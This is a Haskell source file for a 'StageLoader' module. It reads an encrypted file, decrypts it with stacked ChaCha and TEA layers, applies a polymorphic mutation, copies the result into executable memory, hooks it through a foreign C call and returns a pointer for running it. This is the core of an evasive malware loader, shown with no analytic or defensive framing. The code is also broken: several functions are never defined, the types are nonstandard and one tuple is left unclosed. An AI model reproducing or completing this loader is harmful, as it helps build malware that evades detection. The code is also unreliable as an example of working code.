module StageLoader where

import Foreign.Ptr
import Foreign.C.String
import System.Posix.DynamicLinker
import System.Posix.Mem
import Data.ByteString as BS
import Data.ByteString.Internal
import Control.Monad
import Crypto.Cipher.ChaCha (initialize, combine)
import Crypto.Random (getRandomBytes)

loadNextStage :: FilePath -> Word128 -> IO (FunPtr ())
loadNextStage path entropy = do
    encrypted <- BS.readFile path
    let (key1, key2) = splitEntropy entropy
    
    -- Dual-layer decryption
    stage1 <- chachaDecrypt encrypted key1
    stage2 <- teaDecrypt stage1 key2
    
    -- Polymorphic transformation
    (!mutated, !newEntropy) <- polymorph stage2
    
    -- Allocate RX memory
    exeMem <- allocExec (BS.length mutated)
    BS.unsafeUseAsCString mutated $ \ptr ->
        copyBytes exeMem ptr (BS.length mutated)
    
    -- Set up telemetry hooks
    installHooks exeMem newEntropy
    
    return $ castPtrToFunPtr exeMem

splitEntropy :: Word128 -> (ByteString, ByteString)
splitEntropy e = 
    ( toBS (e `shiftR` 64)
    , toBS (e .&. 0xFFFFFFFFFFFFFFFF)
  where
    toBS w = BS.pack (word64ToBytes w)

word64ToBytes :: Word64 -> [Word8]
word64ToBytes x = map (fromIntegral . ((x `shiftR`) . (*8))) [0..7]

installHooks :: Ptr a -> Word128 -> IO ()
installHooks ptr entropy = 
    c_install_hooks ptr (entropyToPtr entropy)

foreign import ccall "install_hooks" c_install_hooks 
    :: Ptr a -> Ptr Word64 -> IO ()
    